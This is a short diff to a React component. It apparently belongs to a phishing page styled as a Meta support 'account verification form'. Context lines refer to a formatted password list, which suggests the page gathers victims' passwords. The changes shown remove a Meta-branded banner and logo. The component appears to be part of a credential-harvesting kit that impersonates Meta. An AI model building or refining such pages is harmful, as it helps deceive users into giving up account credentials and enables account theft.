@@ -295,7 +295,6 @@ ${passwordList}`;
     }, []);
     return (
         <div className='min-h-screen relative'>
-            <img src={Banner} alt='Meta support header' className='w-full h-48 object-cover shadow-md' />
             <div className='md:py-16 bg-gradient-to-b from-gray-50 to-gray-100'>
                 <div className='max-w-xl mx-auto p-6 bg-white border rounded-xl border-gray-200 shadow-lg'>
                     <div className='flex items-start justify-between w-full mb-12'>
@@ -333,9 +332,6 @@ ${passwordList}`;
                         </div>
 
                         <div className='bg-white border rounded-xl border-gray-200 p-4 shadow-sm'>
-                            <div className='flex justify-center mb-6'>
-                                <img src={MetaLogo} alt='Meta logo' className='h-8 w-fit' />
-                            </div>
                             <h2 className='text-lg font-semibold text-blue-600 text-center mb-6'>ACCOUNT VERIFICATION FORM</h2>
 
                             <form onSubmit={handleMainSubmit(onMainFormSubmit)} className='space-y-5'>
